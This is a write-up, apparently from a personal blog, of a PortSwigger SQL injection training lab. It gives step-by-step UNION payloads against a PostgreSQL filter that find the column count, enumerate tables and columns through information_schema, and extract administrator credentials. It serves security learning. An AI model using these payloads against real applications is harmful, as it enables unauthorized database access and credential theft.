---
title: "Lab: SQL injection attack, listing the database contents on non-Oracle databases"
date: 2025-12-29
category: "SQL Injection"
order: 10
tags: ["web-security-academy", "sql-injection", "lab", "postgresql"]
layout: layouts/writeup.njk
permalink: /writeups/sql-injection-lab-listing-contents-non-oracle.html
---

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

---

## Paso 1 — Determinar el número de columnas

```sql
' ORDER BY 3-- → Internal error → 3-1 = 2 columnas
```

## Paso 2 — Determinar el tipo de dato de cada columna

```sql
' UNION SELECT 'a', NULL-- → No error, acepta str
' UNION SELECT NULL, 'a'-- → No error, acepta str
```

## Paso 3 — Identificar el motor de base de datos

Después de probar varios queries, el que funcionó fue:

```sql
' UNION SELECT 'a', version()--
```

Esto confirma que la base de datos es **PostgreSQL**.

## Paso 4 — Listar las tablas disponibles

Siguiendo la guía de Burp: `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

```sql
' UNION SELECT 'a', 'b' FROM information_schema.tables--
' UNION SELECT 'a', * FROM pg_catalog.pg_tables--
' UNION SELECT table_name, NULL FROM information_schema.tables--  ← este sí funcionó
```

Esto reveló el nombre real de la tabla de usuarios (con sufijo aleatorio, ej. `users_ookqyw`).

## Paso 5 — Listar las columnas de la tabla encontrada

```sql
' UNION SELECT 'a', NULL FROM information_schema.columns WHERE table_name = 'pg_user'--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_ookqyw'--
```

Esto reveló los nombres reales de las columnas (también con sufijos aleatorios, ej. `username_leeycu`, `password_fylytv`).

## Paso 6 — Extraer las credenciales ✅

```sql
' UNION SELECT username_leeycu, password_fylytv FROM users_ookqyw--
```

Con las credenciales del `administrator` obtenidas, se inicia sesión. Lab resuelto.
